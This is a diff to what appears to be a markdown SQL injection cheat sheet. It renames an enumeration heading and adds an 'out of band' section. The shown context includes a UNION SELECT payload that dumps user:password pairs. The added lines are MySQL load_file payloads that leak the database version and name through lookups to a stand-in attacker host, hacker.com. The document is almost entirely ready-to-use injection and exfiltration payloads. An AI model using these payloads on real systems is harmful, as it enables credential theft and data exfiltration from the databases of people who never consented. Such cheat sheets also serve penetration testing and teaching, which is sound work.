@@ -86,7 +86,7 @@
 -----
 
 
-#### enumeration
+#### table/column enumeration
 
 *extract list of tables*
 
@@ -99,3 +99,19 @@
 *concat and extract data*
 
 ```1' UNION SELECT 1,concat(user,':',password) FROM users;- -```
+
+-----
+
+
+#### out of band
+
+*database version*
+
+```1’;select load_file(concat('\\\\',version(),'.hacker.com\\s.txt'));```
+
+*database name*
+
+```1’;select load_file(concat('\\\\',database(),'.hacker.com\\s.txt'));```
+
+-----
+
